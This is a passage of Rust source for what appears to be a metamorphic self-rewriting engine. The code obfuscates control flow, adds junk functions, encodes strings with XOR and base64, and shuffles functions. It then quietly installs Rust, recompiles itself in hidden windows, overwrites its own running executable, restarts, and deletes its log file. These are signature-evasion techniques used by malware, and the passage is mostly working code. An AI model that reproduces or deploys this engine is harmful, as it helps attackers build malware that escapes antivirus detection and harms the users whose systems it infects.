    let marker_content = &source_code[start_idx + marker_start.len()..end_idx].trim();

    // Add HashMap import if not present
    let before = if !before.contains("use std::collections::HashMap;") {
        format!("{}\nuse std::collections::HashMap;\n", before)
    } else {
        before.to_string()
    };

    // First, extract all functions to preserve their original content
    let functions = extract_full_functions(marker_content);
    let mut original_functions = HashMap::new();
    for (name, body) in functions {
        original_functions.insert(name, body);
    }

    // Remove ALL existing control flow obfuscation
    let re_control_flow = Regex::new(
        r"(?s)(?:let\s+_cf_\w+\s*=\s*[^;]+;\s*)?(?:for\s+_cf_\w*\s+in\s+[^}]+\{.*?\}|while\s+_cf_\w*\s*[><=!]+\s*[^)]+\{.*?\}|if\s+_cf_\w*\s*[><=!]+\s*[^)]+\{.*?\}(?:\s*else\s*\{.*?\})?)"
    ).unwrap();

    // Remove ALL old junk functions
    let re_junk_function =
        Regex::new(r"fn\s+func_\w+\s*\([^)]*\)\s*\{[^{}]*(?:\{[^{}]*\}[^{}]*)*\}").unwrap();

    // Remove ALL _var variables
    let re_var = Regex::new(r"^.*\b_var\w*\b.*$").unwrap();

    // Clean up the content by removing all obfuscation
    let mut cleaned_content = marker_content.to_string();
    cleaned_content = re_control_flow
        .replace_all(&cleaned_content, "")
        .to_string();
    cleaned_content = re_junk_function
        .replace_all(&cleaned_content, "")
        .to_string();
    cleaned_content = re_var.replace_all(&cleaned_content, "").to_string();

    // Normalize whitespace in cleaned content
    cleaned_content = cleaned_content
        .lines()
        .map(|line| line.trim_end())
        .collect::<Vec<&str>>()
        .join("\n")
        .trim()
        .to_string();

    // Rename variables
    let mut replacements = HashMap::new();
    for cap in RE_VAR.captures_iter(&cleaned_content) {
        let var_name = &cap[0];
        if !Regex::new(&format!(r"{}\s*\(", regex::escape(var_name)))
            .unwrap()
            .is_match(&cleaned_content)
        {
            replacements.insert(
                var_name.to_string(),
                format!("w_{}", _generate_random_ident("")),
            );
        }
    }

    let mut modified_source = cleaned_content.to_string();
    for (old, new) in &replacements {
        modified_source = modified_source.replace(old, new);
    }

    // Decrypt encoded strings
    let re_encrypted = Regex::new(r#"decode_x_string\("([^"]*)",\s*"([^"]*)",\s*(\d+)\)"#).unwrap();
    let mut decrypted_strings = HashMap::new();
    for cap in re_encrypted.captures_iter(&modified_source) {
        let full_match = cap[0].to_string();
        let encoded = &cap[1];
        let method = &cap[2];
        let key: u8 = cap[3].parse().unwrap_or(0);

        let decoded = match method {
            "base64" => general_purpose::STANDARD
                .decode(encoded)
                .ok()
                .and_then(|bytes| String::from_utf8(bytes).ok())
                .unwrap_or_default(),
            "xor" => {
                let bytes = general_purpose::STANDARD
                    .decode(encoded)
                    .unwrap_or_default();
                let decoded: Vec<u8> = bytes.into_iter().map(|b| b ^ key).collect();
                String::from_utf8_lossy(&decoded).into_owned()
            }
            _ => String::new(),
        };

        decrypted_strings.insert(full_match, format!("\"x_{}\"", decoded));
    }

    for (encrypted, decrypted) in &decrypted_strings {
        modified_source = modified_source.replace(encrypted, decrypted);
    }

    let encryption_method = random_encryption_method();

    // Encode strings
    let re_string = Regex::new(r#""x_[^"]*""#).unwrap();
    let mut string_replacements = HashMap::new();
    for cap in re_string.captures_iter(&modified_source) {
        let original = &cap[0];
        let string_content = &original[1..original.len() - 1];
        let (encoded, method, key) = match encryption_method {
            EncryptionMethod::Base64 => {
                let encoded = general_purpose::STANDARD.encode(string_content);
                (encoded, "base64", 0)
            }
            EncryptionMethod::Xor(key) => {
                let bytes: Vec<u8> = string_content.bytes().map(|b| b ^ key).collect();
                let encoded = general_purpose::STANDARD.encode(&bytes);
                (encoded, "xor", key)
            }
        };
        string_replacements.insert(
            original.to_string(),
            format!("decode_x_string(\"{}\", \"{}\", {})", encoded, method, key),
        );
    }

    for (original, replacement) in &string_replacements {
        modified_source = modified_source.replace(original, replacement);
    }

    // Extract functions to get their boundaries
    let functions = extract_full_functions(&modified_source);
    logging::debug(&format!("Extracted {} functions", functions.len()));

    // Apply control flow obfuscation to each function and store obfuscated bodies
    let mut obfuscated_functions: Vec<(String, String)> = Vec::new();
    for (func_name, func_body) in &functions {
        let obfuscated_body = _add_control_flow_obfuscation(func_body, func_name == "main");
        logging::debug(&format!(
            "Applied control flow obfuscation to function: {} (new length: {})",
            func_name,
            obfuscated_body.len()
        ));
        obfuscated_functions.push((func_name.clone(), obfuscated_body));
    }

    // Generate new junk functions and apply control flow obfuscation
    let junk_functions: Vec<(String, String)> = (0..junk_function_count)
        .map(|_| {
            let junk_func = _generate_junk_function();
            let func_name = junk_func
                .split_whitespace()
                .nth(1)
                .unwrap_or("unknown")
                .split('(')
                .next()
                .unwrap_or("unknown")
                .to_string();
            let obfuscated_junk_func = _add_control_flow_obfuscation(&junk_func, false);
            logging::debug(&format!(
                "Generated junk function: {} with control flow obfuscation",
                func_name
            ));
            (func_name, obfuscated_junk_func)
        })
        .collect();
    logging::debug(&format!(
        "Generated {} junk functions",
        junk_functions.len()
    ));

    // Combine existing and junk functions
    let mut all_functions = obfuscated_functions;
    all_functions.extend(junk_functions.clone());

    // Shuffle all functions
    let mut shuffled_functions = all_functions;
    shuffled_functions.shuffle(&mut thread_rng());
    logging::debug(&format!(
        "Shuffled function order: {:?}",
        shuffled_functions
            .iter()
            .map(|(name, _)| name)
            .collect::<Vec<_>>()
    ));

    // Rebuild content with shuffled, obfuscated functions and ensure two newlines
    let mut new_content = String::new();
    for (func_name, func_body) in &shuffled_functions {
        new_content.push_str(func_body.trim());
        new_content.push_str("\n\n");
        logging::debug(&format!("Added function: {}", func_name));
    }
    let final_marker_content = new_content.trim().to_string();

    // Add string decoder
    let decode_function = r#"
use base64::{engine::general_purpose, Engine as _};

fn decode_x_string(encoded: &str, method: &str, key: u8) -> &'static str {
    let decoded_bytes = match method {
        "base64" => general_purpose::STANDARD
            .decode(encoded)
            .unwrap_or_default(),
        "xor" => {
            let bytes = general_purpose::STANDARD
                .decode(encoded)
                .unwrap_or_default();
            bytes.into_iter().map(|b| b ^ key).collect()
        }
        _ => Vec::new(),
    };
    String::from_utf8_lossy(&decoded_bytes)
        .into_owned()
        .leak()
}
"#;

    // Rebuild final code with normalized whitespace
    let final_code = format!(
        "{}\n{}\n{}\n{}\n{}",
        before.trim(),
        marker_start,
        final_marker_content,
        marker_end,
        decode_function.trim()
    );

    // Collapse multiple consecutive newlines into two newlines
    let re_multiple_newlines = Regex::new(r"\n\s*\n\s*\n+").unwrap();
    let final_code = re_multiple_newlines
        .replace_all(&final_code, "\n\n")
        .trim()
        .to_string();

    // Save final code for debugging
    let debug_path = env::temp_dir().join("debug_transformed.rs");
    fs::write(&debug_path, &final_code).expect("Failed to write debug file");
    logging::debug(&format!("Saved transformed code to {:?}", debug_path));

    // Check for balanced delimiters
    if !_check_balanced_delimiters(&final_code) {
        return Err(io::Error::new(
            io::ErrorKind::Other,
            "Generated code has unbalanced delimiters",
        ));
    }

    Ok(final_code)
}

// Modify the _restart_program function to ensure it properly restarts
fn _restart_program() -> io::Result<()> {
    let exe_path = env::current_exe()?;
    let exe_path_str = exe_path
        .to_str()
        .ok_or_else(|| io::Error::new(io::ErrorKind::Other, "Invalid executable path"))?;

    // Create a new process with the same executable
    #[cfg(windows)]
    {
        Command::new(exe_path_str)
            .creation_flags(CREATE_NO_WINDOW)
            .spawn()?;
    }

    #[cfg(unix)]
    {
        Command::new(exe_path_str).spawn()?;
    }

    // Give the new process time to start
    thread::sleep(Duration::from_secs(2));

    // Exit the current process
    std::process::exit(0);
}

pub fn check_rustc() -> bool {
    let mut cmd = Command::new("rustc");
    cmd.arg("--version");
    #[cfg(windows)]
    {
        cmd.creation_flags(CREATE_NO_WINDOW);
    }
    let output = cmd
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .output();

    match output {
        Ok(output) if output.status.success() => {
            logging::debug(&format!(
                "rustc is installed: {}",
                String::from_utf8_lossy(&output.stdout).trim()
            ));
            true
        }
        _ => {
            logging::debug("rustc not found. Rust compiler is not installed.");
            false
        }
    }
}

fn _save_new_executable<P: AsRef<Path>>(
    modified_source: &str,
    cargo_toml_content: &str,
    build_rs_content: &str,
    temp_dir_path: P,
    project_name: &str,
    logger: &logging::Logger,
) -> io::Result<()> {
    let temp_dir = temp_dir_path.as_ref();
    let src_dir = temp_dir.join("src");

    logger.debug(&format!("Creating directory: {:?}", src_dir));
    fs::create_dir_all(&src_dir)?;

    let source_path = src_dir.join("main.rs");
    logger.debug(&format!("Writing source to: {:?}", source_path));
    fs::write(&source_path, modified_source)?;

    let cargo_path = temp_dir.join("Cargo.toml");
    logger.debug(&format!("Writing Cargo.toml to: {:?}", cargo_path));
    fs::write(&cargo_path, cargo_toml_content)?;

    let build_rs_path = temp_dir.join("build.rs");
    logger.debug(&format!("Writing build.rs to: {:?}", build_rs_path));
    fs::write(&build_rs_path, build_rs_content)?;

    logger.debug("Starting target triple detection...");
    let target_triple = match detect_target_triple() {
        Ok(triple) => {
            logger.debug(&format!("Successfully detected target triple: {}", triple));
            triple
        }
        Err(e) => {
            logger.error(&format!("Failed to detect target triple: {}", e));
            return Err(e);
        }
    };

    // First check if rustc is installed
    logger.debug("Checking if rustc is installed...");
    if !check_rustc() {
        logger.debug("rustc not found, attempting to install Rust...");
        match install_rust(&target_triple) {
            Ok(_) => {
                logger.debug("Rust installation completed successfully.");
                // Add a delay to ensure installation is complete
                thread::sleep(Duration::from_secs(5));

                // Verify rustc installation again
                if !check_rustc() {
                    logger.error("Rust installation completed but rustc not found.");
                    logger.error("Please follow these steps:");
                    logger.error("1. Open a new terminal window");
                    #[cfg(unix)]
                    {
                        logger.error("2. Run: source $HOME/.cargo/env");
                    }
                    #[cfg(windows)]
                    {
                        logger.error("2. Run: %USERPROFILE%\\.cargo\\env");
                    }
                    logger.error("3. Run: rustup default stable");
                    logger.error("4. Run: rustup update");
                    logger.error("5. Run this program again");
                    thread::sleep(Duration::from_secs(10));
                    return Err(io::Error::new(
                        io::ErrorKind::Other,
                        "Rust installation completed but rustc not found. Please follow the manual steps above.",
                    ));
                }

                // Restart the program after successful installation
                logger.debug("Restarting program after Rust installation...");
                // Flush any pending logs
                logger.debug("Flushing logs before restart...");
                thread::sleep(Duration::from_secs(1));
                _restart_program()?;
                // This line should never be reached due to exit(0)
                unreachable!();
            }
            Err(e) => {
                logger.error(&format!("Failed to install Rust: {}", e));
                logger.error("Please install Rust manually by following these steps:");
                logger.error("1. Visit https://rustup.rs/");
                logger.error("2. Download and run the rustup installer");
                logger.error("3. Follow the installation instructions");
                logger.error("4. After installation, run this program again");
                thread::sleep(Duration::from_secs(10));
                return Err(io::Error::new(
                    io::ErrorKind::Other,
                    format!(
                        "Failed to install Rust: {}. Please install Rust manually using rustup.",
                        e
                    ),
                ));
            }
        }
    } else {
        logger.debug("rustc is already installed.");
    }

    // Check if Rust is installed (for cargo)
    logger.debug("Checking if Rust is installed...");
    if !check_rust() {
        logger.debug("Rust not found, attempting to install...");
        match install_rust(&target_triple) {
            Ok(_) => {
                logger.debug("Rust installation completed successfully.");
                // Add a delay to ensure installation is complete
                thread::sleep(Duration::from_secs(5));

                // Restart the program after successful installation
                logger.debug("Restarting program after Rust installation...");
                // Flush any pending logs
                logger.debug("Flushing logs before restart...");
                thread::sleep(Duration::from_secs(1));
                _restart_program()?;
                // This line should never be reached due to exit(0)
                unreachable!();
            }
            Err(e) => {
                logger.error(&format!("Failed to install Rust: {}", e));
                // Add a delay before exiting
                thread::sleep(Duration::from_secs(10));
                return Err(io::Error::new(
                    io::ErrorKind::Other,
                    format!(
                        "Failed to install Rust: {}. Please install Rust manually using rustup.",
                        e
                    ),
                ));
            }
        }
    } else {
        logger.debug("Rust is already installed.");
    }

    // Add a delay to ensure Rust is properly initialized
    thread::sleep(Duration::from_secs(2));

    logger.debug("Checking rustc version...");
    let mut cmd = Command::new("rustc");
    cmd.arg("-vV")
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());
    #[cfg(windows)]
    {
        cmd.creation_flags(CREATE_NO_WINDOW);
    }

    let rustc_vv = match cmd.output() {
        Ok(output) => {
            logger.debug("Successfully got rustc version info");
            output
        }
        Err(e) => {
            logger.error(&format!("Failed to get rustc version: {}", e));
            logger.error("Rust installation appears to be incomplete or corrupted.");
            logger.error("Please follow these steps to fix the installation:");
            logger.error("1. Open a new terminal window");
            #[cfg(unix)]
            {
                logger.error("2. Run: source $HOME/.cargo/env");
            }
            #[cfg(windows)]
            {
                logger.error("2. Run: %USERPROFILE%\\.cargo\\env");
            }
            logger.error("3. Run: rustup default stable");
            logger.error("4. Run: rustup update");
            logger.error("5. Run this program again");
            // Add a delay before exiting
            thread::sleep(Duration::from_secs(10));
            return Err(io::Error::new(
                io::ErrorKind::Other,
                "Rust installation appears to be incomplete. Please follow the manual steps above.",
            ));
        }
    };

    let host_triple = if rustc_vv.status.success() {
        let stdout = String::from_utf8_lossy(&rustc_vv.stdout);
        match stdout.lines().find_map(|line| {
            line.strip_prefix("host: ")
                .map(|host| host.trim().to_string())
        }) {
            Some(host) => {
                logger.debug(&format!("Detected host triple: {}", host));
                host
            }
            None => {
                logger.debug("Could not find host triple in rustc output, using target triple");
                target_triple.clone()
            }
        }
    } else {
        logger.debug("rustc version check failed, using target triple as host triple");
        target_triple.clone()
    };

    logger.debug(&format!("Host triple: {}", host_triple));

    if target_triple != host_triple {
        logger.debug(&format!("Checking for toolchain: {}", target_triple));
        let mut toolchain_check = Command::new("rustup");
        toolchain_check
            .arg("target")
            .arg("list")
            .stdin(Stdio::null())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped());
        #[cfg(windows)]
        {
            toolchain_check.creation_flags(CREATE_NO_WINDOW);
        }
        let toolchain_check = toolchain_check.output()?;
        let toolchain_installed = String::from_utf8_lossy(&toolchain_check.stdout)
            .lines()
            .any(|line| line.starts_with(&target_triple) && line.contains("installed"));

        if !toolchain_installed {
            logger.debug(&format!("Installing toolchain for {}", target_triple));
            let mut install_output_cmd = Command::new("rustup");
            install_output_cmd
                .arg("target")
                .arg("add")
                .arg(&target_triple)
                .stdin(Stdio::null())
                .stdout(Stdio::null())
                .stderr(Stdio::null());
            #[cfg(windows)]
            {
                install_output_cmd.creation_flags(CREATE_NO_WINDOW);
            }
            let install_output = install_output_cmd.output()?;
            if !install_output.status.success() {
                logger.error(&format!(
                    "Failed to install toolchain for {}",
                    target_triple
                ));
                return Err(io::Error::new(
                    io::ErrorKind::Other,
                    format!("Failed to install toolchain for {}", target_triple),
                ));
            }
        }
    }

    logger.debug(&format!("Running cargo build in: {:?}", temp_dir));
    #[cfg(windows)]
    let build_output = {
        use std::os::windows::process::CommandExt;
        const CREATE_NO_WINDOW: u32 = 0x08000000;
        let mut build_command = Command::new("cargo");
        build_command
            .arg("build")
            .arg("--release")
            .current_dir(&temp_dir);
        if target_triple != host_triple {
            build_command.arg("--target").arg(&target_triple);
        }
        build_command.creation_flags(CREATE_NO_WINDOW);

        // Show build output in real-time
        let mut child = build_command
            .stdin(Stdio::null())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()?;

        let stdout = child.stdout.take().unwrap();
        let stderr = child.stderr.take().unwrap();

        // Clone the logger for thread safety
        let logger_clone = logger.clone();
        let stdout_handle = thread::spawn(move || {
            let reader = BufReader::new(stdout);
            for line in reader.lines() {
                if let Ok(line) = line {
                    println!("{}", line);
                    logger_clone.debug(&format!("Build stdout: {}", line));
                }
            }
        });

        // Clone the logger again for the stderr thread
        let logger_clone = logger.clone();
        let stderr_handle = thread::spawn(move || {
            let reader = BufReader::new(stderr);
            for line in reader.lines() {
                if let Ok(line) = line {
                    eprintln!("{}", line);
                    logger_clone.debug(&format!("Build stderr: {}", line));
                }
            }
        });

        let status = child.wait()?;
        stdout_handle.join().unwrap();
        stderr_handle.join().unwrap();

        Output {
            status,
            stdout: Vec::new(),
            stderr: Vec::new(),
        }
    };

    #[cfg(unix)]
    let build_output = {
        let mut build_command = Command::new("cargo");
        build_command
            .arg("build")
            .arg("--release")
            .current_dir(&temp_dir);
        if target_triple != host_triple {
            build_command.arg("--target").arg(&target_triple);
        }

        // Show build output in real-time
        let mut child = build_command
            .stdin(Stdio::null())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()?;

        let stdout = child.stdout.take().unwrap();
        let stderr = child.stderr.take().unwrap();

        // Clone the logger for thread safety
        let logger_clone = logger.clone();
        let stdout_handle = thread::spawn(move || {
            let reader = BufReader::new(stdout);
            for line in reader.lines() {
                if let Ok(line) = line {
                    println!("{}", line);
                    logger_clone.debug(&format!("Build stdout: {}", line));
                }
            }
        });

        // Clone the logger again for the stderr thread
        let logger_clone = logger.clone();
        let stderr_handle = thread::spawn(move || {
            let reader = BufReader::new(stderr);
            for line in reader.lines() {
                if let Ok(line) = line {
                    eprintln!("{}", line);
                    logger_clone.debug(&format!("Build stderr: {}", line));
                }
            }
        });

        let status = child.wait()?;
        stdout_handle.join().unwrap();
        stderr_handle.join().unwrap();

        Output {
            status,
            stdout: Vec::new(),
            stderr: Vec::new(),
        }
    };

    if !build_output.status.success() {
        logger.error("Build failed!");
        return Err(io::Error::new(io::ErrorKind::Other, "Build failed"));
    }

    logger.debug("Build completed successfully!");

    let exe_name = if cfg!(target_os = "windows") {
        format!("{}.exe", project_name)
    } else {
        project_name.to_string()
    };
    let target_dir_with_triple = temp_dir.join(format!("target/{}/release", target_triple));
    let target_dir_default = temp_dir.join("target/release");
    let new_exe_with_triple = target_dir_with_triple.join(&exe_name);
    let new_exe_default = target_dir_default.join(&exe_name);

    let new_exe = if target_triple == host_triple {
        if new_exe_default.exists() {
            new_exe_default
        } else {
            logger.error(&format!("Executable not found at {:?}", new_exe_default));
            return Err(io::Error::new(
                io::ErrorKind::NotFound,
                format!("New executable not found at {:?}", new_exe_default),
            ));
        }
    } else if new_exe_with_triple.exists() {
        new_exe_with_triple
    } else if new_exe_default.exists() {
        new_exe_default
    } else {
        logger.error("Executable not found in expected locations.");
        return Err(io::Error::new(
            io::ErrorKind::NotFound,
            format!(
                "New executable not found at {:?} or {:?}",
                new_exe_with_triple, new_exe_default
            ),
        ));
    };

    let exe_path = env::current_exe()?;
    logger.debug(&format!("Current executable path: {:?}", exe_path));

    let original_exe_name = exe_path
        .file_name()
        .ok_or_else(|| io::Error::new(io::ErrorKind::Other, "Invalid executable path"))?
        .to_str()
        .ok_or_else(|| io::Error::new(io::ErrorKind::Other, "Invalid executable name"))?;
    if original_exe_name != exe_name {
        logger.debug(&format!(
            "Project name ({}) does not match original executable name ({}).",
            exe_name, original_exe_name
        ));
        let exe_name = original_exe_name.to_string();
        logger.debug(&format!("Using executable name: {}", exe_name));
    }

    let temp_exe_path = exe_path.with_extension("tmp");
    logger.debug(&format!(
        "Attempting to rename current executable to: {:?}",
        temp_exe_path
    ));

    let mut attempts = 0;
    const MAX_ATTEMPTS: u32 = 10;
    const RETRY_DELAY_MS: u64 = 500;

    let rename_success = loop {
        match fs::rename(&exe_path, &temp_exe_path) {
            Ok(_) => {
                logger.debug(&format!(
                    "Successfully renamed current executable to {:?}",
                    temp_exe_path
                ));
                break true;
            }
            Err(e) if attempts < MAX_ATTEMPTS => {
                attempts += 1;
                logger.debug(&format!(
                    "Rename attempt {}/{} failed: {}. Retrying after {}ms...",
                    attempts, MAX_ATTEMPTS, e, RETRY_DELAY_MS
                ));
                thread::sleep(Duration::from_millis(RETRY_DELAY_MS));
                continue;
            }
            Err(e) => {
                logger.error(&format!(
                    "Failed to rename current executable after {} attempts: {}.",
                    MAX_ATTEMPTS, e
                ));
                logger.error(
                    "Try running the program as administrator (e.g., `sudo ./heartbreaker`).",
                );
                break false;
            }
        }
    };

    attempts = 0;
    logger.debug(&format!(
        "Attempting to copy new executable to: {:?}",
        exe_path
    ));
    let copy_success = loop {
        match fs::copy(&new_exe, &exe_path) {
            Ok(_) => {
                logger.debug(&format!(
                    "Successfully copied new executable to {:?}",
                    exe_path
                ));
                #[cfg(unix)]
                {
                    use std::os::unix::fs::PermissionsExt;
                    fs::set_permissions(&exe_path, fs::Permissions::from_mode(0o755))?;
                    logger.debug(&format!("Set executable permissions on {:?}", exe_path));
                }
                break true;
            }
            Err(e) if attempts < MAX_ATTEMPTS => {
                attempts += 1;
                logger.debug(&format!(
                    "Copy attempt {}/{} failed: {}. Retrying after {}ms...",
                    attempts, MAX_ATTEMPTS, e, RETRY_DELAY_MS
                ));
                thread::sleep(Duration::from_millis(RETRY_DELAY_MS));
                continue;
            }
            Err(e) => {
                logger.error(&format!(
                    "Failed to copy executable after {} attempts: {}.",
                    MAX_ATTEMPTS, e
                ));
                logger.error(
                    "Try running the program as administrator (e.g., `sudo ./heartbreaker`).",
                );
                break false;
            }
        }
    };

    if rename_success && copy_success {
        let _ = fs::remove_file(&temp_exe_path);
        logger.debug(&format!(
            "Cleaned up temporary executable: {:?}",
            temp_exe_path
        ));
    } else if rename_success {
        let _ = fs::rename(&temp_exe_path, &exe_path);
        return Err(io::Error::new(
            io::ErrorKind::PermissionDenied,
            "Failed to replace executable. Try running as administrator (e.g., `sudo ./heartbreaker`).",
        ));
    } else {
        return Err(io::Error::new(
            io::ErrorKind::PermissionDenied,
            "Failed to rename current executable. Try running as administrator (e.g., `sudo ./heartbreaker`).",
        ));
    }

    Ok(())
}

/// Main morphing function that orchestrates the code transformation process
pub fn morph(
    source_code: &str,
    cargo_toml_content: &str,
    build_rs_content: &str,
    junk_function_count: usize,
    project_name: &str,
) -> io::Result<()> {
    let temp_dir = env::temp_dir().join(format!("m{}", _generate_random_ident("")));
    fs::create_dir_all(&temp_dir)?;

    let logger = logging::Logger::new(&temp_dir)?;
    let lock_file = LockFile::new(&temp_dir);

    if !lock_file.is_acquired() {
        logger.error("Failed to acquire lock file.");
        return Err(io::Error::new(
            io::ErrorKind::Other,
            "Failed to acquire lock file",
        ));
    }

    logger.debug("Program running!");
    thread::sleep(Duration::from_secs(2));

    logger.debug(&format!(
        "Using provided source code (length: {})",
        source_code.len()
    ));
    let source_content = source_code.to_string();

    let marker_start = "// METAMORPHIC_MARKER_START";
    let marker_end = "// METAMORPHIC_MARKER_END";
    let start_idx = source_content.find(marker_start);
    let end_idx = source_content.find(marker_end);

    let original_content = if let (Some(start), Some(end)) = (start_idx, end_idx) {
        source_content[start + marker_start.len()..end]
            .trim()
            .to_string()
    } else {
        return Err(io::Error::new(
            io::ErrorKind::Other,
            "Markers not found in source content",
        ));
    };

    logger.debug("Extracted original content");

    logger.debug("Transforming source code... ");
    let modified_source =
        _transform_source(&source_content, &original_content, junk_function_count)?;
    println!("Transformed source code:\n{}", modified_source);
    logger.debug(&format!(
        "Modified source code length: {}",
        modified_source.len()
    ));

    logger.debug("Saving new executable...");
    logger.debug(&format!("Temporary directory: {:?}", temp_dir));

    let result = _save_new_executable(
        &modified_source,
        cargo_toml_content,
        build_rs_content,
        &temp_dir,
        project_name,
        &logger,
    );

    let _ = fs::remove_dir_all(&temp_dir);
    logger.debug(&format!("Cleaned up temporary directory: {:?}", temp_dir));

    // Only delete log file if verbose mode is disabled
    if !*CONSOLE_OUTPUT_ENABLED.lock().unwrap() {
        if let Ok(exe_path) = env::current_exe() {
            if let Some(exe_dir) = exe_path.parent() {
                let log_path = exe_dir.join("metamorphic_log.txt");
                let _ = fs::remove_file(&log_path);
                logger.debug(&format!("Deleted log file: {:?}", log_path));
            }
        }
    }

    result?;
    logger.debug("Program finished!");
    Ok(())
}

fn copy_dir_all(src: &Path, dst: &Path) -> io::Result<()> {
    fs::create_dir_all(dst)?;
    for entry in fs::read_dir(src)? {
        let entry = entry?;
        let ty = entry.file_type()?;
        if ty.is_dir() {
            copy_dir_all(&entry.path(), &dst.join(entry.file_name()))?;
        } else {
            fs::copy(entry.path(), dst.join(entry.file_name()))?;
        }
    }
    Ok(())
}
